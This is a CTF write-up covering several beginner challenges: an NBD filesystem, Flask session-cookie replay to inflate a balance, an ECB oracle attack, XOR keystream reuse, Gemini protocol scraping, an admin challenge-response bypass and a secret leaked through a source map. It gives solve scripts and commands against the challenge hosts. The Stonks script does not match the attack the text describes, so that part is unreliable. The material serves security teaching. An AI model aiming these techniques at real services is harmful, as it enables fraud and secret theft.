      7          Backend: &blockDeviceBackend{BlockDevice: blockDevice},
      8      },
      9  }, &gonbd.Options{}); err != nil {
   2. FFiilleessyysstteemm GGeenneerraattiioonn: It generates a complex directory structure with
      dummy files and images:
      1 func generateFilesystem(flag string, levels int, dummyFilesPerDirectory
        int, dummyImagesPerDir int, spreadDirectoriesPerDirectory int)
   3. FFllaagg PPllaacceemmeenntt: Most importantly, it places the flag in a random bottom
      directory but creates a symlink for easy access:
      1 // make a symlink to the flag file in the challenge directory
      2 symlink := filesystem.Factory.NewSymlink(path.Unix.Join(bottomDir.path,
      3 flagFileName))
        if _, err := challengeDir.Create("flag.jpg", symlink); err != nil {
   4. IImmaaggee GGeenneerraattiioonn: The flag is embedded as text in a JPEG image:
      1 func generateTextPNG(text string, width int, height int) ([]byte,
        error)
From this analysis, we understand that:
    * The server exports a filesystem named “root” via NBD protocol
    * The flag is stored as a JPEG image with embedded text
    * There’s a convenient symlink called flag.jpg in the root directory
Now let’s connect to the NBD server at chal.2025.ductf.net:30016:
1 sudo nbd-client -N root chal.2025.ductf.net 30016 /dev/nbd0
OOuuttppuutt::
1 Negotiation: ..size = 16MB
2 Connected /dev/nbd0
Next, we create a mount point and mount the network block device:
1 sudo mkdir /mnt/nbd
2 sudo mount /dev/nbd0 /mnt/nbd
Now let’s explore the filesystem structure:
1 ls -la /mnt/nbd
OOuuttppuutt::
1  total 60
2  drwxr-xr-x 6 root root 4096 Jul 20  2025 .
3  drwxr-xr-x 5 root root 4096 Jul 20 11:07 ..
4  drwxr-xr-x 5 root root 4096 Jul 20  2025 d51711969
5  drwxr-xr-x 5 root root 4096 Jul 20  2025 da633a8ee
6  drwxr-xr-x 5 root root 4096 Jul 20  2025 db4e243c7
7  -rwxr-xr-x 1 root root 2175 Jul 20  2025 f0c674982.txt
8  -rwxr-xr-x 1 root root 2179 Jul 20  2025 f158306ef.txt
9  -rwxr-xr-x 1 root root 2186 Jul 20  2025 f210a6689.txt
10 -rwxr-xr-x 1 root root 2178 Jul 20  2025 f44cf1760.txt
11 -rwxr-xr-x 1 root root 2198 Jul 20  2025 f519574aa.txt
12 -rwxr-xr-x 1 root root 2161 Jul 20  2025 f73a909a2.txt
13 -rwxr-xr-x 1 root root 2151 Jul 20  2025 f98f17826.jpg
14 -rwxr-xr-x 1 root root 2181 Jul 20  2025 fbbfb16fc.txt
15 -rwxr-xr-x 1 root root 2182 Jul 20  2025 ffa10e79f.txt
16 lrwxr-xr-x 1 root root   43 Jun  7  1906 flag.jpg -> da633a8ee/d657a4f33/
17 db895ec78/fa2b9fe58.jpg
   drwx------ 2 root root 4096 Jul 20  2025 lost+found
Perfect! We can see there’s a symbolic link flag.jpg that points to the actual
flag file deep in the directory structure: da633a8ee/d657a4f33/db895ec78/
fa2b9fe58.jpg.
As predicted from our code analysis, the Go program created a complex
filesystem with multiple levels of directories containing dummy files, but
cleverly placed a symlink in the root directory for easy access to the flag.
Now let’s open the JPEG image to retrieve the flag:
1 xdg-open /mnt/nbd/flag.jpg
The image opens and shows the flag text embedded in the image:
_[_F_l_a_g_ _I_m_a_g_e_]
TThhee JJPPEEGG iimmaaggee ddiissppllaayyiinngg tthhee ffllaagg tteexxtt
FFllaagg:: DUCTF{now_you_know_how_to_use_nbd_4y742rr2}
_[_g_o_l_f_]
CChhaalllleennggee 99:: SSttoonnkkss
SSoollvveess:: 265
CCaatteeggoorryy:: Beginner / Web
DDeessccrriippttiioonn
     Times were wild before the email apocalypse. There were even sites
     giving out free money that also supported currency conversions!
     WWAARRNNIINNGG: This challenge contains flashing colours! To disable add
     ?boring=true to the end of the URL when you visit the site.
SSoollvvee
We are given a Flask web application that simulates a currency exchange
platform. Let’s analyze the source code to understand the vulnerability.
Looking at the stonks.py file, we can see several key components:
   1. CCuurrrreennccyy SSyysstteemm: The app supports multiple currencies with conversion
      rates:
      1  CURRENCY_CONVERSIONS = {
      2   "AUD": 1,
      3   "NZD": 1.08,
      4   "EUR": 0.56,
      5   "USD": 0.65,
      6   "GBP": 0.48,
      7   "CAD": 0.89,
      8   "JPY": 94.48,
      9   "CNY": 4.65,
      10  "KRW": 888.04,
      11  "PLN": 2.39,
      12  "ZAR": 11.64,
      13  "INR": 55.89,
      14  "IDR": 10597.38
      15 }
   2. RRiicchh CChheecckk: To get the flag, we need to have more than 1 trillion AUD:
      ```python SUPER_RICH = 1_000_000_000_000
def are_you_rich(): balance_aud = user_balances.get(u, 0) /
CURRENCY_CONVERSIONS[currency] if balance_aud > SUPER_RICH: return
render_template(“are-you-rich.html”, message=f”YES YOU ARE! HERE IS A FLAG
{FLAG}”)
1 3. **The Vulnerability**: In the `change_currency` function, there's a
2 critical flaw:
3 ```python
4 if u not in user_balances:
5     user_balances[u] = STONKS_GIFT * user_currencies[u]
This line is the key vulnerability! If a user’s balance is somehow missing from
user_balances, it gets reset to STONKS_GIFT * user_currencies[u]. The problem
is that user_currencies[u] can be set to any numeric value, not just valid
currency codes.
TThhee RReeaall VVuullnneerraabbiilliittyy::
The problem is with how Flask session cookies work - they’re ssttaatteelleessss. The
application uses the currency value from the user’s session cookie for currency
conversions, but you can reuse old session cookies with different currency
values to break the conversion logic.
Here’s how the currency conversion works:
1 user_balances[u] = (user_balances[u] / CURRENCY_CONVERSIONS[old_currency]) *
  CURRENCY_CONVERSIONS[new_currency]
The issue is that old_currency comes from session["currency"], which can be
manipulated by reusing old session cookies.
AAttttaacckk SStteeppss::
   1. SSeett uupp tthhee sseessssiioonn: First, I went to the website, registered an account,
      and set my currency to GBP through the website interface. I saved this
      session cookie.
   2. EExxppllooiitt tthhee ccoonnvveerrssiioonn: Using the saved GBP session cookie, I repeatedly
      sent requests to POST /change-currency to convert from GBP to IDR
      multiple times.
   3. BBaallaannccee iinnffllaattiioonn: Each time I made this request with the GBP session
      cookie, the calculation became:
      1 Balance_new = Balance_old / 0.48 × 10597.38
      This means each conversion multiplies the balance by approximately
      22,000!
   4. RReeppeeaatt uunnttiill rriicchh: I kept running the script and manually changing
      currencies until the balance exceeded 1,000,000,000,000 AUD.
1  import requests
2
3  BASE = "https://[link-to-challenge]/"
4  s = requests.Session()
5
6  def register():
7      s.post(BASE + "/register", data={
8          "username": "master",
9          "password": "master",
10         "confirm_password": "master"
11     })
12     s.post(BASE + "/login", data={
13         "username": "master",
14         "password": "master"
15     })
16
17 def set_fake_currency(numeric_value):
18     # Manually force currency to a numeric value
19     s.post(BASE + "/change-currency", data={
20         "currency": str(numeric_value)  # not in conversions
21     })
22
23 def trigger_balance_reset():
24     # Delete your balance by making it disappear
25     # (simulate by restarting server or modifying code if needed)
26     # Then trigger change-currency which runs:
27     # user_balances[u] = STONKS_GIFT * user_currencies[u]
28     s.post(BASE + "/change-currency", data={
29         "currency": "IDR"
30     })
31
32 def check_flag():
33     r = s.get(BASE + "/are-you-rich")
34     print(r.text)
35
36 register()
37 set_fake_currency(1e13)   # set currency to a huge number
38 trigger_balance_reset()   # this will multiply 50 * 1e12 = 5e13
39 check_flag()
The key insight is that by reusing the GBP session cookie while converting to
IDR, I could exploit the stateless nature of Flask sessions to perform the same
high-multiplication currency conversion repeatedly, inflating the balance
exponentially.
FFllaagg:: DUCTF{r3u5iNg_d3R_S35510N5_4_St000o0oONKsS5!}
_[_s_t_o_n_k_s_]
CChhaalllleennggee 1100:: EECCBB--AA--TTRROONN 99000000
SSoollvveess:: 219
CCaatteeggoorryy:: Beginner / Crypto
DDeessccrriippttiioonn
     I AM ECB A TRON 9000 FEED ME YOUR CODEBOOKS
We’re presented with a web interface that allows us to encrypt our input:
_[_E_C_B_-_A_-_T_R_O_N_ _9_0_0_0_ _I_n_t_e_r_f_a_c_e_]
The interface shows input fields for entering text, with “Encrypt” and “Help”
buttons.
HHeellpp
HHeellpp The EECCBB--AA--TTRROONN 99000000 appends a secret phrase to your input before
encrypting. Can you abuse this somehow and recover the secret? Wrap the secret
phrase like this:DUCTF{<secret phrase>}for the flag
HHiinnttss
    * To get you started, have a look at this page (https://en.wikipedia.org/
      wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB))
    * The secret phrase consists of only capital English characters.
    * If the plaintext length isn’t divisible by 16, it is padded with space
      (0x20) characters.
    * Use bbrruuttee ffoorrccee mmooddee if you need to repeat many requests for a single
      position!
WWhhyy TThhiiss AAttttaacckk WWoorrkkss
This challenge exploits a fundamental weakness in ECB (Electronic Codebook)
mode encryption. In ECB mode:
   1. DDeetteerrmmiinniissttiicc eennccrryyppttiioonn:: Identical plaintext blocks always produce
      identical ciphertext blocks
   2. BBlloocckk iinnddeeppeennddeennccee:: Each 16-byte block is encrypted separately
   3. NNoo rraannddoommiizzaattiioonn:: The same input always produces the same output
The vulnerability occurs because we can control part of the input and observe
how it affects the encrypted output. Since the secret is appended to our input,
we can manipulate block boundaries to isolate and identify each character of
the secret.
SSoollvvee
AAttttaacckk SSttrraatteeggyy:: By carefully crafting our input length, we can align the
secret phrase with block boundaries and use ECB’s deterministic nature to
reveal the secret character by character.
SStteepp--bbyy--sstteepp pprroocceessss::
   1. FFiinndd tthhee ffiirrsstt cchhaarraacctteerr::
          o Input: AAAAAAAAAAAAAAA (15 A’s)
          o This creates: AAAAAAAAAAAAAAA + [FIRST_CHAR_OF_SECRET] + rest of
            secret
          o The first block becomes: AAAAAAAAAAAAAAA[FIRST_CHAR]
          o Encrypted result: yg06AwD25jSyH853SVeACA...
   2. BBrruuttee ffoorrccee tthhee ffiirrsstt cchhaarraacctteerr::
          o Try AAAAAAAAAAAAAAAD, AAAAAAAAAAAAAAAE, etc.
          o When we input AAAAAAAAAAAAAAAD, we get the same first block:
            yg06AwD25jSyH853SVeACA
          o This confirms the first character is D
   3. CCoonnttiinnuuee tthhee ppaatttteerrnn::
          o For second character: AAAAAAAAAAAAAD + [SECOND_CHAR]
          o For third character: AAAAAAAAAAAD + [KNOWN_CHARS] + [THIRD_CHAR]
          o And so on…
IImmpplleemmeennttaattiioonn:: Using the site’s “brute force mode” feature, we systematically
recovered each character by comparing encrypted blocks until we found matches.
OOuuttppuutt::
1 Secret phrase: DONTUSEECBPLEASE
FFllaagg:: DUCTF{DONTUSEECBPLEASE}
_[_t_r_o_n_]
CChhaalllleennggee 1111:: HHuunnggrryy HHuunnggrryy CCaatteerrppiillllaarr
SSoollvveess:: 208
CCaatteeggoorryy:: Beginner / Crypto
DDeessccrriippttiioonn
     Just like how the author confused chrysalides for cocoons, I always
     get the title of this book confused.
     NOTE: The flag format is DUCTF{[a-z_]*}
We’re given two files: challenge.py and output.txt.
CChhaalllleennggee AAnnaallyyssiiss
Looking at challenge.py, we can see the encryption logic:
1  #!/usr/bin/env python3
2
3  import os
4
5  def xor(a, b):
6      return bytes(left ^ right for left, right in zip(a, b))
7
8  def main():
9      flag = open("flag.txt", "rb").read()
10     assert flag[1] == ord("U")
11     flag += os.urandom(len(flag) * 6)
12     keystream = os.urandom(len(flag))
13
14     print(f"""
15         [Story text...]
16
17         On Monday he ate through one apple. But he was still hungry.
18         {xor(flag[::1], keystream).hex()}
19
20         On Tuesday he ate through two pears, but he was still hungry.
21         {xor(flag[::2], keystream).hex()}
22
23         On Wednesday he ate through three plums, but he was still hungry.
24         {xor(flag[::3], keystream).hex()}
25
26         [... continues for each day with different strides ...]
27     """)
KKeeyy oobbsseerrvvaattiioonnss::
   1. The flag is padded with 6 times its length in random bytes
   2. A single keystream is used to XOR different strides of the extended flag
   3. We get 7 different outputs: flag[::1], flag[::2], …, flag[::7]
   4. We know flag[1] == 'U' and the flag format DUCTF{[a-z_]*}
TThhee VVuullnneerraabbiilliittyy
The vulnerability lies in reusing the same keystream with different strides.
This creates relationships between the encrypted outputs that we can exploit:
    * output_1[i] = flag[i] ⊕ keystream[i]
    * output_k[i] = flag[k*i] ⊕ keystream[i]
Therefore: output_1[i] ⊕ output_k[i] = flag[i] ⊕ flag[k*i]
This means if we know one of flag[i] or flag[k*i], we can recover the other!
SSoollvvee
1  import binascii
2
3  # Paste hex outputs from the challenge here (shortened examples)
4  output_1_hex =
5  "f3c9202e92ad822d2370f86fe79b4ad0ec27d69ddeb95fc77e6ba7dfa987054137632111ba2901747b831b118444286d280ab8ad2cc701d3a40706f6da7e079b4c53931f3949fdaec7c0a18d318704fd51610080ec553d57f21ae8506584efe46e8a16078b4f71f3d41eac2076bd4d8dd32d7ad93d682c6152b885a5db05061a17f0884a2ef037e09cdae260f5ca51e12b7e91f9a0134351e31ab7270f8a8b4f18986d93d277691905f84149c8f72eeb4c9fbab4281721a8dba241e8e99b5f3aef8a1fe5777bf03416e4c1b78cecfea79d76df95768110e556b4f1a9f8570aa48d2d6173110a4212114cdd1522483c0ee9b84696a796766feb29875899488533e2b5763287364709f279e41b7f32f408093cdf0abcf3344f96d35401215d32736beb5b4a2943c4ebe60e43dce10aafd5a3f61202bc10c4fb930a5dedc8e447280483d20e1c85db4469a6c69200613641a1c8794b6ef8d227cdfb009f68d37e7519c6e08dab661368b36d5acfb22c9b942b05703544ef8ba21651c2855592d62646ca1253fdcaaf0fa18c001e74934fc78dceefdc95987835cf2188eddac55c6856bba83fd2a0f75076584fa599abd737b71c041cd94eb6f481e08cec201d6764e49ae8f68a2b53dee888bdcaf25b6d149c6ac71c3fbeeba30ce06489adcf532abba9bd023cf8bed44c6d4a972fa9033d86"
6  output_2_hex = "f3df250eb1be98371946e47ff98f57ddec2ada99c6b465f7515ab5dea19a2e463769256ff5037d27d725c2d4a70daa249ef247b8a7346f04238a246817e649546c5b8e1f05cc153cafde3745fa154634d5abaa67bbfff0e191c6349917007866071e22809a719e8f72e9656fe2198605b3af66938553829b0065f1691d2565fdb789761f85b878158fc538d813cc3e4f3e90ec97a5bb93301918a556d0c45d00e9bd91285e660ea7087d6d38f229e31d4d9709d25a2a4d9a8565ae37c9b4881e75658ed1f00b71852219ddf3cdd4f10445dbd9cb9aa0daf1a3910820e727c0f4ff9f68c927ffc23f1b4d376f5825ff72e515314b83fee3a88f"
7  output_3_hex = "f3c81725baaf9f293642e479ec9559deec14d386f5a753e5244eee5e7ed74f7881250a52dd1293f4853fc70caf6cbf33353464c435e54b732cb0fd27672ebdb293755843f938371b7b5d3827c335ecca5162d6c28a4a9c6551a97ceeaa8cfe9ed07bbe6e78fe0f81994732b9ae2d2b3ad1c2318c294f6be1509a7f6cc052cfa47209929e79e196b42187b5d3d176572a0a949b3a65ec93c2ec7bba304f0f189a905679963b7a"
8  output_4_hex = "f3da06148ba2862a194afc45d69d5ff6ec2e95e56a6d4675e7a53eb026b8e308177419879d95b665538f9519c4d1d8b3f7c6565701fdfbcf43969cc645928f37cca525501616f353baa33295000799e224572600b6d3ca2c907546f549ef58b19d8fa501ae6ddf80aaef89a517e099cfc1a650138fb9f8580c12d5fc79"
9  output_5_hex = "f3e70b03a08982312a58fe7fd69032d37396818d3be288839c37b0ed2484c3072cc5370a3d979757977fbab0a2e316cdb718f530d70ec7ccc776f65ae7cf3787a6002eba077a6ecb7dcdf2a30c5440fc258662c192dd4deee868b48f59ec7c824b6794ea"
10 output_6_hex = "f3e80d13a4a293241943cf73a3c680975a01bd0b38684e604c86ac94296193fce8a2e5a5499a8fcfd7f3a47504996535205ab4c6eaaab76221c1302f151c529d0941d9beb89b313a8ed4f295f51806a75dbf43"
11 output_7_hex = "f3f41116bba29724215d9a8231dba19e53dc02eb488a30d7e15b3ae96ba7b1bbe82a2d1601d63b8413174b56c35d2df7959d4fe5cf5e19fde97b7f7c43f1df75e1c7fd1ff2b5ec"
12
13 # Convert to bytes
14 outputs = [
15     binascii.unhexlify(output_1_hex),
16     binascii.unhexlify(output_2_hex),
17     binascii.unhexlify(output_3_hex),
18     binascii.unhexlify(output_4_hex),
19     binascii.unhexlify(output_5_hex),
20     binascii.unhexlify(output_6_hex),
21     binascii.unhexlify(output_7_hex),
22 ]
23
24 flag_len = len(outputs[0])  # length of flag+padding (stride 1 output)
25 max_index = (flag_len // 7)  # We don't know flag length exactly, guess max
26
27 # Known start of flag (ASCII)
28 # From the assertion: flag[1] = 'U'
29 # We know the format: D U C T F { ...
30 known_flag_start = b"DUCTF{"
31
32 # We'll create a list to hold recovered flag bytes
33 recovered_flag = [None] * max_index
34
35 # Initialize with known bytes from known_flag_start
36 for i in range(len(known_flag_start)):
37     recovered_flag[i] = known_flag_start[i]
38
39 # Helper function to XOR two bytestrings
40 def bxor(a, b):
41     return bytes(x ^ y for x, y in zip(a, b))
42
43 print("[*] Starting recovery...")
44
45 # Use the relationship:
46 # output_1[i] XOR output_k[i] = flag[i] XOR flag[k*i]
47 # If flag[i] known, can get flag[k*i], and vice versa.
48
49 changed = True
50 while changed:
51     changed = False
52     for k in range(2, 8):  # for outputs 2 to 7
53         out1 = outputs[0]
54         outk = outputs[k-1]
55         length = min(len(out1), len(outk))
56         for i in range(length):
57             idx1 = i
58             idx2 = k * i
59             if idx2 >= max_index:
60                 continue
61
62             val1 = out1[i]
63             valk = outk[i]
64             xor_flag = val1 ^ valk  # = flag[i] XOR flag[k*i]
65
66             f1 = recovered_flag[idx1]
67             f2 = recovered_flag[idx2]
68
69             if f1 is not None and f2 is None:
70                 recovered_flag[idx2] = f1 ^ xor_flag
71                 changed = True
72             elif f2 is not None and f1 is None:
73                 recovered_flag[idx1] = f2 ^ xor_flag
74                 changed = True
75             # else if both known or both unknown, no update
76
77 print("[*] Recovery done.\n")
78
79 # Try to print the flag
80 print("Recovered flag bytes (partial or full):")
81
82 # Print as ASCII where possible, '.' if unknown
83 flag_str = ""
84 for b in recovered_flag[:]:  # print all bytes
85     if b is None:
86         flag_str += "."
87     elif 32 <= b < 127:
88         flag_str += chr(b)
89     elif b == recovered_flag[-1]:
90         flag_str += "}"
91         break
92     else:
93         flag_str += "?"
94
95 print(flag_str)
Running the recovery script gives us:
1 DUCTF{the_h.n.ry_.i.tl..p_.mo.t._..te...l.a..w.._an...l.g..._..r_.....}
This is a partial recovery. Now we need to fill in the gaps using context and
educated guessing:
SStteepp 11:: Recognize the pattern - this appears to be related to “The Very Hungry
Caterpillar” story SStteepp 22:: Fill in obvious words:
    * the_h.n.ry → the_hungry
    * .i.tl. → little
    * _..te...l.a. → caterpillar
SStteepp 33:: Continue pattern recognition with some calculations:
1 DUCTF{the_hungry_little_p_smooth_caterpillar_w.._an_a.legor._for_life}
SStteepp 44:: Final guessing for remaining gaps:
    * w.. → won
    * a.legor. → allegory
OOuuttppuutt::
  Partial flag: DUCTF
1 {the_h.n.ry_.i.tl..p_.mo.t._..te...l.a..w.._an...l.g..._..r_.....}
2 Final flag:   DUCTF
  {the_hungry_little_p_smooth_caterpillar_won_an_allegory_for_life}
FFllaagg:: DUCTF{the_hungry_little_p_smooth_caterpillar_won_an_allegory_for_life}
_[_e_n_g_l_i_s_h_]
CChhaalllleennggee 1122:: HHoorroossccooppeess
SSoollvveess:: 199
CCaatteeggoorryy:: Beginner / Misc
DDeessccrriippttiioonn
     HHeeyy SSiiss!! IIttss ggeettttiinngg pprreettttyy bbaadd oouutt hheerree.... tthheeyy kkeeeepp tteelllliinngg uuss ttoo
     ccoonnnneecctt oonn tthhiiss nneeww aanndd iimmpprroovveedd pprroottooccooll.. TThhee rreegguullaarr wweebb iiss bbeeiinngg
     ssyysstteemmaattiiccaallllyy aattttaacckkeedd aanndd ccoommpprroommiisseedd
     LLiittttllee TToommmmyy hhaass bbeeeenn bboorrnn!! HHee?’ss aa TTaauurruuss jjuusstt aa mmoonntthh bbeeffoorree
     mmaattcchhiinngg hhiiss mmuumm aanndd ddaadd!! HHooppee ttoo sseeee yyoouu aallll ffoorr CChhrriissttmmaass
     LLoovvee,, XXXXXXXX
CCoonnnneeccttiioonn:: nc chal.2025.ductf.net 30015
SSoollvvee
We start by connecting to the given netcat service to see what we’re dealing
with:
1 nc chal.2025.ductf.net 30015
However, any input we send just returns 2. This seems unusual, so let’s examine
the raw response using xxd:
1 nc chal.2025.ductf.net 30015 | xxd
2 00000000: 1503 0300 0202 32                        ......2
The response starts with 15 03 03, which is the TLS handshake pattern! This
indicates we’re dealing with a TLS-encrypted connection, not plain text.
Let’s try connecting with OpenSSL:
1 openssl s_client -connect chal.2025.ductf.net:30015
This establishes a TLS connection but waits for our input. However, basic HTTP
requests don’t work. After some experimentation with different flags:
1 openssl s_client -connect chal.2025.ductf.net:30015 -crlf -ign_eof
Now when we send something, we get an error:
1 59 Invalid URL
Let’s try using HTTPS protocol:
1 https://chal.2025.ductf.net
Response:
1 53 Unsupported URL scheme
This tells us the protocol is wrong. Looking back at the challenge description,
there’s a hint about a “new and improved protocol” and the mention of problems
with the “regular web”.
The key insight is that this is referencing the GGeemmiinnii pprroottooccooll - a simple,
privacy-focused internet protocol that’s an alternative to HTTP/HTTPS.
Let’s try a Gemini request:
1 gemini://chal.2025.ductf.net
RReessppoonnssee::
   # Welcome to the Wasteland Network
   The year is 2831. It's been XXXX years since The Collapse. The old web is
   dead - corrupted by the HTTPS viral cascade that turned our connected world
   into a weapon against us.
1
2  But we survive. We adapt. We rebuild.
3
4  This simple Gemini capsule is one node in the new network we're building -
5  free from the complexity that doomed the old internet. No JavaScript. No
6  cookies. No tracking. Just pure, clean information exchange.
7
8  Some pages are struggling with corruption as we take further attacks.
9
10 ## Navigation
11 => /survival.gmi Survival Basics: First Steps in the New World
12 => /salvaging.gmi Tech Salvaging: Safe Computing After the Fall
13 => /community-hub.gmi Community Hub: Finding Other Survivors
14 => /about-us.gmi About the Wasteland Network
15
16 ## Daily Advisory
17 ⚠ ALERT: Increased bot activity reported in old HTTP sectors 44-48. Avoid
18 all mainstream browser use in these digital quadrants.
19 ⚠ REMINDER: Always verify capsule certificates before sharing sensitive
20 information. Trust no one who won't use Gemini protocol.
21 ⚠ WARNING: Protocol has sustainnnnnned damages. Corruption detected within
22 [------]. ProceeX with cauXXXn
23
24 ## Message of the Day
25 DUCTF{g3mini_pr0t0col_s4ved_us}
26
27 "The old web was a mansion with a thousand unlocked doors. The new web is a
28 bunker with one good lock."
29 - Ada, Network Founder
30
31 Remember: Simple is safe. Complex is compromise.
32
   ## Update Log
   * 2831-04-04: Added new communications relay points in sectors 7 and 9
   * 2831-04-03: Updated survival maps for Western salvage zones
   * 2831-04-01: Repaired node connection to Australian wasteland network
FFllaagg:: DUCTF{g3mini_pr0t0col_s4ved_us}
CChhaalllleennggee 1133:: WWiikkii
SSoollvveess:: 168
CCaatteeggoorryy:: Beginner / Misc
DDeessccrriippttiioonn
     Use the Wiki to find the flag…
     NNOOTTEE:: This challenge is a continuation of “Horoscopes”, we recommend
     you complete that challenge first!
SSoollvvee
This challenge builds upon the Horoscopes challenge, so we know we need to use
the Gemini protocol to connect to chal.2025.ductf.net:30015.
From exploring the previous challenge, we discovered there’s a linker page at /
linker.gmi that contains links to all available pages on the site. Looking at
the linker page, we can see there are many pages available - over 100 different
links to various content.
Since we need to search through all these pages to find the flag, manual
exploration would be time-consuming. Instead, we can write a script to
automatically fetch all pages and search for the flag.
PPyytthhoonn SSccrriipptt::
1  import socket
2  import ssl
3  import time
4  import urllib.parse
5  import os
6
7  HOST = "chal.2025.ductf.net"
8  PORT = 30015
9  BASE_URL = "gemini://chal.2025.ductf.net"
10
11 def send_gemini_request(path="gemini://chal.2025.ductf.net/"):
12     context = ssl.create_default_context()
13     context.check_hostname = False
14     context.verify_mode = ssl.CERT_NONE
15
16     with socket.create_connection((HOST, PORT)) as sock:
17         with context.wrap_socket(sock, server_hostname=HOST) as ssock:
18             time.sleep(5)  # wait 5 seconds before sending request
19             request = path + "\r\n"
20             ssock.sendall(request.encode())
21             time.sleep(1)  # wait 1 second for response
22
23             response = b""
24             while True:
25                 try:
26                     data = ssock.recv(4096)
27                     if not data:
28                         break
29                     response += data
30                 except socket.timeout:
31                     break
32             return response.decode(errors='ignore')
33
34 def build_absolute_url(current_url, link):
35     parsed = urllib.parse.urlparse(current_url)
36     base_path = parsed.path
37     if base_path.endswith('/'):
38         base_dir = base_path
39     else:
40         base_dir = base_path.rsplit('/', 1)[0] + '/'
41
42     link_stripped = link.lstrip('/')
43     new_path = urllib.parse.urljoin(base_dir, link_stripped)
44     return f"{parsed.scheme}://{parsed.netloc}{new_path}"
45
46 def scrape_links_from_response(response):
47     links = []
48     for line in response.splitlines():
49         if line.startswith("=>"):
50             parts = line.split(maxsplit=2)
51             if len(parts) >= 2:
52                 links.append(parts[1])
53     return links
54
55 def save_content_to_file(url, content):
56     parsed = urllib.parse.urlparse(url)
57     filename = os.path.basename(parsed.path)
58     if not filename:
59         filename = "index.gmi"
60     # Replace any problematic chars in filename
61     filename = filename.replace('/', '_')
62
63     with open(filename, "w", encoding="utf-8") as f:
64         f.write(content)
65
66 def main():
67     start_path = BASE_URL + "/linker.gmi"
68     print(f"Fetching links from {start_path} ...")
69     response = send_gemini_request(start_path)
70     links = scrape_links_from_response(response)
71
72     if not links:
73         print("No links found.")
74         return
75
76     absolute_links = [build_absolute_url(start_path, link) for link in
77 links]
78     print(f"Found {len(absolute_links)} links. Fetching each...")
79
80     for url in absolute_links:
81         print(f"Fetching {url} ...")
82         content = send_gemini_request(url)
83         save_content_to_file(url, content)
84         print(f"Saved {url} content.")
85
86 if __name__ == "__main__":
       main()
After running this script to download all the pages, we can search for flags
using grep:
1 grep -ri "DUCTF{" .
OOuuttppuutt::
1 ./index.gmi:DUCTF{g3mini_pr0t0col_s4ved_us}
2 ./rabid_bean_potato.gmi:DUCTF
  {rabbit_is_rabbit_bean_is_bean_potato_is_potato_banana_is_banana_carrot_is_carrot}
The first flag is from the Horoscopes challenge, and the second flag is what
we’re looking for in the Wiki challenge.
FFllaagg:: DUCTF
{rabbit_is_rabbit_bean_is_bean_potato_is_potato_banana_is_banana_carrot_is_carrot}
_[_w_i_k_i_]
CChhaalllleennggee 1144:: TTrruusstteedd
SSoollvveess:: 105
CCaatteeggoorryy:: Beginner / Misc
DDeessccrriippttiioonn
     It looks like they never really finished their admin panel.. Or they
     let the intern do it. The connection info and credentials are all
     inside the server, but we can’t seem to get in.
     Maybe you can take a look at it and tell us whats behind the admin
     panel?
     NNOOTTEE:: This challenge is a continuation of “Horoscopes”, we recommend
     you complete that challenge first!
SSoollvvee
This challenge continues the Gemini protocol series. Since we already have all
the pages downloaded from the Wiki challenge, we can search through them for
admin-related information.
First, let’s search for “admin” references in our downloaded files:
1 grep -ri "admin" .
OOuuttppuutt::
1 ./community-hub.gmi:## Admin Panel
2 ./community-hub.gmi:To access the community admin panel connect to port: 756f
Let’s examine the community-hub.gmi file more closely:
1 cat community-hub.gmi
Key information from the file:
1 ## Admin Panel
2 To access the community admin panel connect to port: 756f
3 Use the daily code phrase to prove you're not a bot.
The port 756f is in hexadecimal, which converts to decimal port 30063.
Let’s try connecting to this port:
1 nc chal.2025.ductf.net 30063
The connection closes quickly if we don’t send data immediately, so let’s use a
pipe to send a Gemini request:
1 echo -e "gemini://chal.2025.ductf.net/" | nc chal.2025.ductf.net 30063
RReessppoonnssee::
1 20 text/gemini
2 # Admin Panel
3 This page is under construction!
4 If you are the admin, you should login
5 => password_protected.gmi Login
Now let’s access the login page:
1 echo -e "gemini://chal.2025.ductf.net/password_protected.gmi" | nc
  chal.2025.ductf.net 30063
RReessppoonnssee::
1 11 Moonlight reflects twice on still water
This appears to be a challenge-response authentication. We need to find the
response to this phrase in our downloaded files. Let’s search:
1 grep -ri "Moonlight reflects twice on still water" .
Looking through the verification-codes.gmi file, we find:
1 ## Daily Code Phrase
2 Today's authentication phrase: "Moonlight reflects twice on still water"
3 Response: "But+ripples+show=truth%in motion"
Now we need to URL-encode this response and send it as a query parameter:
  echo -e "gemini://chal.2025.ductf.net/
1 password_protected.gmi?But%2Bripples%2Bshow%3Dtruth%25in%20motion" | nc
  chal.2025.ductf.net 30063
RReessppoonnssee::
1 20 text/gemini
2 # Welcome, Admin!
3 You have successfully logged in.
4 > DUCTF{Cr1pPl3_Th3_1nFr4sTrUCtu53}
FFllaagg:: DUCTF{Cr1pPl3_Th3_1nFr4sTrUCtu53}
_[_i_n_t_e_r_n_]
===============================================================================
?🌐 WWeebb CChhaalllleennggeess
CChhaalllleennggee 11:: MMiinnii--MMee
SSoollvveess:: 855
CCaatteeggoorriieess:: web
DDeessccrriippttiioonn
     The app looks scrambled and full of brainrot! But there’s more than
     meets the eye. Dive into the code, connect the dots, and see if you
     can uncover what’s really going on behind the scenes, or right at the
     front!
     Challenge URL: https://web-mini-me-ab6d19a7ea6e.2025.ductf.net/
RReeccoonnnnaaiissssaannccee
1 # Initial directory structure analysis
2 .
3 ├── app.py
4 └── templates
5     ├── confidential.html
6     └── index.html
Examining the Flask application (app.py), we find several key endpoints:
    * / - Main index page
    * /login - Redirects to confidential page
    * /confidential.html - Confidential page
    * /admin/flag - Flag endpoint requiring API key authentication
VVuullnneerraabbiilliittyy AAsssseessssmmeenntt
The critical vulnerability lies in client-side exposure of sensitive
information. The application contains:
   1. SSoouurrccee MMaapp EExxppoossuurree: A comment in the minified JavaScript hints at a
      source map file
   2. OObbffuussccaatteedd CClliieenntt--SSiiddee SSeeccrreett: The source map reveals an obfuscated
      function containing the API key
   3. WWeeaakk OObbffuussccaattiioonn: The obfuscation uses simple XOR operations that can be
      easily reversed
From the source map file (test-main.min.js.map), we discovered the qyrbkc()
function containing obfuscated character codes that decode to the API secret
key.
EExxppllooiittaattiioonn
SStteepp 11:: EExxttrraacctt tthhee oobbffuussccaatteedd ccooddeess ffrroomm tthhee ssoouurrccee mmaapp
1 // From the qyrbkc() function in test-main.min.js.map
2 const codes = [85, 87, 77, 67, 40, 82, 82, 70, 78, 39, 95, 89, 67, 73, 34,
  68, 68, 92, 84, 57, 70, 87, 95, 77, 75];
SStteepp 22:: DDeeccooddee tthhee XXOORR oobbffuussccaattiioonn
